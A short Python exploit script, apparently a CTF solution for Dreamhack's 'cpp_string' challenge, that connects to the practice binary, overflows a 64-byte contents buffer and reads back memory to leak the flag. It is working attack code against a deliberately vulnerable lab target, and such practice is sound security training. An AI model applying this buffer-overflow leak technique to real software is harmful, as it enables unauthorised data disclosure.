#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./cpp_string")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 17825)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def read_file():
        io.sendlineafter("input : ", "1")
        return

    def write_file(contents: bytes):
        io.sendlineafter("input : ", "2")
        # if len(contents) == 64:
        #     io.sendafter("contents", contents)
        # else:
        # io.sendlineafter("contents", contents)
        io.sendlineafter("contents", contents)
        return

    def show_contents() -> bytes:
        io.sendlineafter("input : ", "3")
        io.recvuntil("contents : ")
        return io.recvline()

    write_file(b"A" * 64)
    read_file()
    flag = "DH{" + show_contents().decode().split("DH{")[1]
    ptr.logger.info(f"flag: {flag}")
    return


if __name__ == "__main__":
    main()
